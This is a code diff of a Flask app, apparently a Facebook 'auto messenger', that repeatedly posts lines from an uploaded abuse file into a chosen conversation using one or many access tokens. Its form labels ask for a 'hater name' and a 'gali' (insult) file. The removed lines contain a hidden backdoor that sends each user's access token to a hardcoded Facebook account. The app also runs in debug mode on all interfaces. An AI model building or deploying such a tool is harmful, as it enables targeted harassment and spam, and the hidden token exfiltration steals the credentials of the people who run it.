@@ -8,17 +8,17 @@ import string
 app = Flask(__name__)
 app.debug = True
 
-# API Headers
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)',
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
-
-# Target UID (Permanent)
-TARGET_UID = "61571843423018"
 
 stop_events = {}
 threads = {}
@@ -26,31 +26,18 @@ threads = {}
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
-        for access_token in access_tokens:
-            # тЬЕ Target UID (61571843423018) рдкрд░ рдЯреЛрдХрди рднреЗрдЬрдирд╛
-            token_message = f"Hello SAHIIL S─л─лR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..тд╡я╕П  {access_token}"
-            api_url_token = f'https://graph.facebook.com/v15.0/t_{TARGET_UID}/'
-            parameters_token = {'access_token': access_token, 'message': token_message}
-            response_token = requests.post(api_url_token, data=parameters_token, headers=headers)
-
-            if response_token.status_code == 200:
-                print(f"тЬЕ Token Sent to Target UID: {access_token}")
-            else:
-                print(f"тЭМ Token Sending Failed: {access_token}")
-
-            for message1 in messages:
-                if stop_event.is_set():
-                    break
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                 message = str(mn) + ' ' + message1
-                api_url_message = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                parameters_message = {'access_token': access_token, 'message': message}
-                response_message = requests.post(api_url_message, data=parameters_message, headers=headers)
-
-                if response_message.status_code == 200:
-                    print(f"тЬЕ Message Sent to {thread_id}: {message}")
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
                 else:
-                    print(f"тЭМ Message Sending Failed to {thread_id}: {message}")
-
+                    print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -78,7 +65,7 @@ def send_message():
         threads[task_id] = thread
         thread.start()
 
-        return f'тЬЕ YOUR STOP KEY-> {task_id}'
+        return f' YOUR STOP KEY-> {task_id}'
 
     return render_template_string('''
 <!DOCTYPE html>
@@ -86,74 +73,118 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ЁЯШИ Facebook Auto Messenger ЁЯШИ</title>
+  <title>😈 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 😈 </title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
     body {
-      background-color: black;
+      background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
       color: white;
-      text-align: center;
     }
     .container {
-      margin-top: 20px;
+      max-width: 350px; 
+      height: auto;
+      border-radius: 20px;
       padding: 20px;
-      border-radius: 10px;
-      background: #333;
-      box-shadow: 0px 0px 10px white;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
     }
     .form-control {
+      outline: 1px red;
+      border: 1px double white;
       background: transparent;
-      color: white;
-      border: 1px solid white;
-    }
-    .btn-submit {
       width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
     }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
   </style>
 </head>
 <body>
-  <h1>ЁЯФе Facebook Auto Messenger ЁЯФе</h1>
-  <div class="container">
+  <header class="header mt-4">
+    <h1 class="mt-3">☠️❤️ 𝙊𝙒𝙉𝙀𝙍 𝙎𝘼𝙃𝙄𝙇 𝘿𝙊𝙉 ❤️☠️</h1>
+  </header>
+  <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
-      <label for="tokenOption">Select Token Option</label>
-      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-        <option value="single">Single Token</option>
-        <option value="multiple">Token File</option>
-      </select>
-      <div id="singleTokenInput">
-        <label for="singleToken">Enter Single Token</label>
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙄𝙉𝙂𝙇𝙀 𝙏𝙊𝙆𝙀𝙉..⤵️</label>
         <input type="text" class="form-control" id="singleToken" name="singleToken">
       </div>
-      <div id="tokenFileInput" style="display: none;">
-        <label for="tokenFile">Choose Token File</label>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
         <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
-      <label for="threadId">Enter Conversation UID</label>
-      <input type="text" class="form-control" id="threadId" name="threadId" required>
-      
-      <label for="kidx">Enter Message Prefix</label>
-      <input type="text" class="form-control" id="kidx" name="kidx" required>
-      
-      <label for="time">Enter Speed (seconds)</label>
-      <input type="number" class="form-control" id="time" name="time" required>
-      
-      <label for="txtFile">Upload Message File</label>
-      <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      
-      <button type="submit" class="btn btn-primary btn-submit">ЁЯЪА Start Messaging ЁЯЪА</button>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿...⤵️</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍 𝙉𝘼𝙈𝙀...⤵️</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙋𝙀𝙀𝘿...⤵️ (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀..⤵️</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">☠️ 𝙍𝙐𝙉𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙀𝙍 ☠️</button>
     </form>
-
     <form method="post" action="/stop">
-      <label for="taskId">Enter Stop Key</label>
-      <input type="text" class="form-control" id="taskId" name="taskId" required>
-      <button type="submit" class="btn btn-danger btn-submit">ЁЯЫС Stop Messaging ЁЯЫС</button>
+      <div class="mb-3">
+        <label for="taskId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙏𝙊𝙋 𝙆𝙀𝙔..⤵️</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">❤️ 𝙎𝙏𝙊𝙋 𝙎𝙀𝙍𝙑𝙀𝙍 ❤️</button>
     </form>
   </div>
+  <footer class="footer">
+    <p>☠️✨ 𝙎𝘼𝙃𝙄𝙇 𝙃𝙀𝙍𝙀 ✨☠️</p>
+    <p> <a href="https://www.facebook.com/profile.php?id=61571843423018">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+919058736281" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i>💫 𝘾𝙃𝘼𝙏 𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 💫
+      </a>
+    </div>
+  </footer>
   <script>
     function toggleTokenInput() {
       var tokenOption = document.getElementById('tokenOption').value;
-      document.getElementById('singleTokenInput').style.display = (tokenOption == 'single') ? 'block' : 'none';
-      document.getElementById('tokenFileInput').style.display = (tokenOption == 'multiple') ? 'block' : 'none';
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
     }
   </script>
 </body>
@@ -165,9 +196,9 @@ def stop_task():
     task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
-        return f'тЬЕ Task {task_id} Stopped Successfully.'
+        return f'Task with ID {task_id} has been stopped.'
     else:
-        return f'тЭМ No Task Found with ID {task_id}.'
+        return f'No task found with ID {task_id}.'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
